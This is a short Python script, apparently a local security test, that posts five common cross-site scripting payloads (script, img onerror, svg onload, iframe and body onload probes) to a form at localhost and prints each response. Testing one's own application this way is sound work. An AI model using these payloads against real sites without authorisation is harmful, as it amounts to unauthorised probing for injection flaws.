import requests

attacks = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert('xss')>",
    "<iframe src='javascript:alert(1)'>",
    "<body onload=alert('xss')>"
]

for payload in attacks:
    data = {
        "name": "attacker",
        "email": "xss@example.com",
        "message": payload
    }
    print(f"\n[XSS] Testing payload: {payload}")
    try:
        res = requests.post("http://localhost:5000/submit", data=data)
        print(f"> Status: {res.status_code}")
        print(f"> Response: {res.text[:100]}")
    except Exception as e:
        print(f"> Error: {e}")
